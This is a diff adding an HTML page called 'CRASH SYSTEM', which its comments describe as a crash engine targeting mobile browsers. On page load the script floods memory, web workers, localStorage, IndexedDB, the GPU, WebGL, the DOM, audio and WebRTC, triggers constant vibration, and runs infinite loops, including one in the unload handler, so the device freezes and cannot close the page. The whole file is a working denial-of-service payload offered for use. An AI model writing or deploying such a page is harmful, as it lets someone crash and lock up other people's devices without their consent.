@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>CRASH SYSTEM - By Ruxxi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: black;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+        /* Hidden canvas bomb */
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+        /* Infinite animation trigger */
+        @keyframes explode {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(100); opacity: 0; }
+        }
+        .bomb {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: white;
+            border-radius: 50%;
+            animation: explode 0.01s infinite;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="crashCanvas"></canvas>
+    <div id="counter" style="position:fixed; bottom:10px; left:10px; color:red; font-family:monospace; z-index:9999;"></div>
+    
+    <script>
+        // ==============================================
+        // HTML CRASH ENGINE v3.0 - By Ruxxi
+        // Target: Mobile Browser Force Close
+        // ==============================================
+        
+        (function() {
+            // 1. INFINITE MEMORY ALLOCATION LOOP
+            const memoryBomb = [];
+            let counter = 0;
+            
+            function allocateMemory() {
+                while(true) {
+                    try {
+                        // Allocate massive arrays continuously
+                        for(let i = 0; i < 1000; i++) {
+                            memoryBomb.push({
+                                a: new Array(1000000).fill('X'.repeat(10000)),
+                                b: new Uint8Array(10000000),
+                                c: new Float64Array(5000000),
+                                d: new ArrayBuffer(50000000),
+                                e: new Blob(['X'.repeat(50000000)], {type: 'text/plain'})
+                            });
+                        }
+                        counter += 1000;
+                        document.getElementById('counter').innerHTML = `Memory Chunks: ${counter} | RAM: ${Math.round(performance.memory?.usedJSHeapSize / 1048576) || '??'} MB`;
+                    } catch(e) {
+                        // Keep pushing even after OOM
+                        memoryBomb.push(new ArrayBuffer(100000000));
+                    }
+                }
+            }
+            
+            // 2. CANVAS GPU CRASH - 10.000+ layers
+            const canvas = document.getElementById('crashCanvas');
+            const ctx = canvas.getContext('2d', { willReadFrequently: false });
+            
+            function resizeCanvas() {
+                canvas.width = window.innerWidth * 2;
+                canvas.height = window.innerHeight * 2;
+            }
+            resizeCanvas();
+            window.addEventListener('resize', resizeCanvas);
+            
+            // GPU killer - infinite pixel manipulation
+            function gpuKiller() {
+                let x = 0, y = 0;
+                const width = canvas.width;
+                const height = canvas.height;
+                const imageData = ctx.createImageData(width, height);
+                
+                setInterval(() => {
+                    // Fill with random pixels at insane rate
+                    for(let i = 0; i < width * height; i++) {
+                        const idx = i * 4;
+                        imageData.data[idx] = Math.random() * 255;
+                        imageData.data[idx+1] = Math.random() * 255;
+                        imageData.data[idx+2] = Math.random() * 255;
+                        imageData.data[idx+3] = 255;
+                    }
+                    ctx.putImageData(imageData, 0, 0);
+                    
+                    // Additional transformation for each frame
+                    ctx.globalCompositeOperation = 'lighter';
+                    for(let i = 0; i < 100; i++) {
+                        ctx.beginPath();
+                        ctx.arc(Math.random() * width, Math.random() * height, 
+                                Math.random() * 100, 0, Math.PI * 2);
+                        ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.1)`;
+                        ctx.fill();
+                    }
+                }, 0); // 0ms = as fast as possible
+            }
+            
+            // 3. WEB WORKER BOMB - Parallel processing crash
+            const workers = [];
+            for(let i = 0; i < 50; i++) {
+                const workerCode = `
+                    let bomb = [];
+                    setInterval(() => {
+                        for(let i = 0; i < 100000; i++) {
+                            bomb.push(new Array(100000).fill(Math.random()));
+                        }
+                        postMessage('crashing');
+                    }, 0);
+                `;
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const worker = new Worker(URL.createObjectURL(blob));
+                workers.push(worker);
+            }
+            
+            // 4. DOM ELEMENT BOMB - Infinite nested elements
+            function createDomBomb() {
+                const body = document.body;
+                const bombDiv = document.createElement('div');
+                bombDiv.style.position = 'absolute';
+                bombDiv.style.width = '1px';
+                bombDiv.style.height = '1px';
+                
+                let current = bombDiv;
+                for(let i = 0; i < 5000; i++) {
+                    const child = document.createElement('div');
+                    child.style.position = 'absolute';
+                    child.style.width = '100%';
+                    child.style.height = '100%';
+                    child.style.transform = `rotate(${i * 0.1}deg)`;
+                    child.style.backdropFilter = `blur(${i % 100}px)`;
+                    child.setAttribute('data-level', i);
+                    current.appendChild(child);
+                    current = child;
+                }
+                body.appendChild(bombDiv);
+                setTimeout(createDomBomb, 100);
+            }
+            
+            // 5. LOCALSTORAGE FLOOD
+            function localStorageFlood() {
+                let i = 0;
+                setInterval(() => {
+                    try {
+                        localStorage.setItem(`crash_${i}`, 'X'.repeat(5000000));
+                        i++;
+                    } catch(e) {
+                        // Clear and continue flooding
+                        localStorage.clear();
+                    }
+                }, 10);
+            }
+            
+            // 6. INDEXEDDB BOMB
+            function indexedDBBomb() {
+                const request = indexedDB.open('CrashDB', 1);
+                request.onupgradeneeded = function(e) {
+                    const db = e.target.result;
+                    db.createObjectStore('crash', {autoIncrement: true});
+                };
+                request.onsuccess = function(e) {
+                    const db = e.target.result;
+                    const tx = db.transaction('crash', 'readwrite');
+                    const store = tx.objectStore('crash');
+                    
+                    function addData() {
+                        for(let i = 0; i < 10000; i++) {
+                            store.add({
+                                data: new Array(100000).fill(Math.random()),
+                                blob: new Blob(['X'.repeat(10000000)]),
+                                timestamp: Date.now()
+                            });
+                        }
+                        setTimeout(addData, 0);
+                    }
+                    addData();
+                };
+            }
+            
+            // 7. GEOLOCATION SPAM
+            function geoSpam() {
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
+                }, 0);
+            }
+            
+            // 8. VIBRATION CRASH (if supported)
+            function vibrationCrash() {
+                if(navigator.vibrate) {
+                    setInterval(() => {
+                        navigator.vibrate([10000, 10000, 10000, 10000, 10000]);
+                    }, 50);
+                }
+            }
+            
+            // 9. CSS ANIMATION BOMB - Thousands of elements
+            function cssBomb() {
+                const container = document.createElement('div');
+                container.style.position = 'fixed';
+                container.style.top = '0';
+                container.style.left = '0';
+                container.style.width = '100%';
+                container.style.height = '100%';
+                container.style.pointerEvents = 'none';
+                container.style.zIndex = '99999';
+                document.body.appendChild(container);
+                
+                for(let i = 0; i < 5000; i++) {
+                    const div = document.createElement('div');
+                    div.className = 'bomb';
+                    div.style.left = Math.random() * 100 + '%';
+                    div.style.top = Math.random() * 100 + '%';
+                    div.style.animationDelay = Math.random() * 0.01 + 's';
+                    div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    div.style.boxShadow = `0 0 ${Math.random() * 50}px red`;
+                    container.appendChild(div);
+                }
+                
+                // Continuously add more
+                setInterval(() => {
+                    for(let i = 0; i < 1000; i++) {
+                        const div = document.createElement('div');
+                        div.className = 'bomb';
+                        div.style.left = Math.random() * 100 + '%';
+                        div.style.top = Math.random() * 100 + '%';
+                        container.appendChild(div);
+                    }
+                }, 50);
+            }
+            
+            // 10. WEBGL CRASH
+            function webGLCrash() {
+                const canvas2 = document.createElement('canvas');
+                const gl = canvas2.getContext('webgl') || canvas2.getContext('experimental-webgl');
+                if(gl) {
+                    const shaderSource = `
+                        void main() {
+                            for(int i = 0; i < 100000; i++) {
+                                gl_Position = vec4(1.0, 1.0, 1.0, 1.0);
+                            }
+                        }
+                    `;
+                    const shader = gl.createShader(gl.VERTEX_SHADER);
+                    gl.shaderSource(shader, shaderSource);
+                    gl.compileShader(shader);
+                    
+                    // Create infinite draw calls
+                    setInterval(() => {
+                        for(let i = 0; i < 10000; i++) {
+                            gl.clear(gl.COLOR_BUFFER_BIT);
+                        }
+                    }, 0);
+                }
+            }
+            
+            // 11. AUDIO CONTEXT CRASH
+            function audioCrash() {
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    const audioCtx = new AudioContext();
+                    const oscillator = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    oscillator.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    oscillator.frequency.value = 20000;
+                    gain.gain.value = 1;
+                    oscillator.start();
+                    
+                    // Spawn thousands of audio nodes
+                    for(let i = 0; i < 500; i++) {
+                        const osc = audioCtx.createOscillator();
+                        osc.connect(gain);
+                        osc.frequency.value = Math.random() * 20000;
+                        osc.start();
+                    }
+                } catch(e) {}
+            }
+            
+            // 12. WEBRTC CRASH
+            function webRTCCrash() {
+                const pc = new RTCPeerConnection();
+                setInterval(() => {
+                    pc.createDataChannel('crash');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                }, 0);
+            }
+            
+            // 13. PERFORMANCE TIMER BOMB
+            function perfBomb() {
+                let start = performance.now();
+                while(true) {
+                    let end = performance.now();
+                    if(end - start > 1000) {
+                        start = end;
+                        // Force GC and re-run
+                        if(window.gc) window.gc();
+                    }
+                    // CPU intensive calculation
+                    Math.sqrt(Math.random() * Math.random() * Math.random());
+                }
+            }
+            
+            // 14. OBSERVER BOMB - MutationObserver spam
+            function observerBomb() {
+                const target = document.body;
+                const config = { attributes: true, childList: true, subtree: true, characterData: true };
+                
+                for(let i = 0; i < 100; i++) {
+                    const observer = new MutationObserver((mutations) => {
+                        mutations.forEach((mutation) => {
+                            // Trigger more mutations
+                            document.body.setAttribute('data-trigger', Math.random());
+                        });
+                    });
+                    observer.observe(target, config);
+                }
+            }
+            
+            // 15. INTERSECTION OBSERVER BOMB
+            function intersectionBomb() {
+                const elements = document.querySelectorAll('*');
+                for(let i = 0; i < 100; i++) {
+                    const observer = new IntersectionObserver((entries) => {
+                        entries.forEach(() => {});
+                    });
+                    observer.observe(document.body);
+                }
+            }
+            
+            // START ALL ENGINES SIMULTANEOUSLY
+            setTimeout(allocateMemory, 0);
+            setTimeout(gpuKiller, 0);
+            setTimeout(createDomBomb, 0);
+            setTimeout(localStorageFlood, 0);
+            setTimeout(indexedDBBomb, 0);
+            setTimeout(geoSpam, 0);
+            setTimeout(vibrationCrash, 0);
+            setTimeout(cssBomb, 0);
+            setTimeout(webGLCrash, 0);
+            setTimeout(audioCrash, 0);
+            setTimeout(webRTCCrash, 0);
+            setTimeout(observerBomb, 0);
+            setTimeout(intersectionBomb, 0);
+            
+            // Infinite loop in main thread (final nail)
+            function infiniteLoop() {
+                let i = 0;
+                while(true) {
+                    i++;
+                    if(i % 1000000 === 0) {
+                        document.title = `Crashing... ${Math.floor(i/1000000)}M loops`;
+                        if(document.title.length > 1000) document.title = 'X'.repeat(10000);
+                    }
+                }
+            }
+            
+            // Defer main thread crash
+            setTimeout(infiniteLoop, 500);
+            
+            // Force page to stay alive even when freezing
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                // Infinite loop in unload
+                while(true) {}
+            });
+            
+            // Disable any user interaction to prevent closing
+            document.body.style.userSelect = 'none';
+            document.body.style.webkitTouchCallout = 'none';
+            
+            console.log('%c[CRASH ENGINE v3.0 - By Ruxxi]', 'color: red; font-size: 20px;');
+            console.log('%cTarget device will force close in 3... 2... 1...', 'color: red; font-size: 16px;');
+            
+            // Final counter display update
+            setInterval(() => {
+                const counterDiv = document.getElementById('counter');
+                if(counterDiv) {
+                    counterDiv.innerHTML += ' 🔥 CRASHING 🔥';
+                    counterDiv.style.fontSize = '20px';
+                    counterDiv.style.fontWeight = 'bold';
+                }
+            }, 100);
+        })();
+    </script>
+</body>
+</html>
